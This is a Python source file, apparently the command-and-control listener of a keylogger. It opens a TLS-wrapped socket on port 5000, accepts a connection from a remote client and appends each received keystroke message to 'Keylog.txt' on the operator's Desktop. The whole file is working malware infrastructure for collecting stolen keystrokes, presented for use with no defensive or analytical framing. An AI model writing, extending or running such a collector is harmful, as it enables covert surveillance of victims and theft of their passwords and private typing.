import socket
import ssl
import tempfile
import threading

from colorama import Fore
from pathlib import Path
import certs




def get_user_path():
    return "{}/".format(Path.home())


def recv_out(secure_conn):

    while True:
        output = secure_conn.recv(4096)
        return output


def write_file(text, location, filename):

    # Archivo a crear
    with open(location + filename, "a", encoding="utf-8") as log:
        log.write(text)


def connec(cert, key):
    # Lista vacia de letras
    keys = []

    # Definimos location y nombre del archivo
    location = get_user_path() + "Desktop/"
    filename = "Keylog.txt"

    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    context.check_hostname = False

    # Add the certificate and private key to the context.
    context.load_cert_chain(certfile=cert.name, keyfile=key.name)

    socks = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socks.bind(('0.0.0.0', 5000))
    socks.listen(1)
    print(Fore.CYAN + "|[!] Listening on 5000|")

    # Aceptamos conexiones entrantes...
    conn, addr = socks.accept()
    print(Fore.CYAN + f"[!] Connection on port 5000...\t{addr} ")
    secure_conn = context.wrap_socket(conn, server_side=True)

    while True:
        msg = recv_out(secure_conn).decode()
        if __name__ == "__main__":
            print(msg)
        keys.append(msg)

        write_file(msg, location, filename)


def main():
    try:
        cert = tempfile.NamedTemporaryFile(delete=False)
        cert.write(certs.get_crte().encode())
        cert.close()

        key = tempfile.NamedTemporaryFile(delete=False)
        key.write(certs.get_locker().encode())
        key.close()

        keylog_thread = threading.Thread(target=connec, args=(cert, key))
        keylog_thread.start()
    except KeyboardInterrupt:
        exit()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(Fore.RED + "\n\t Exiting..."+ Fore.RESET)
        exit()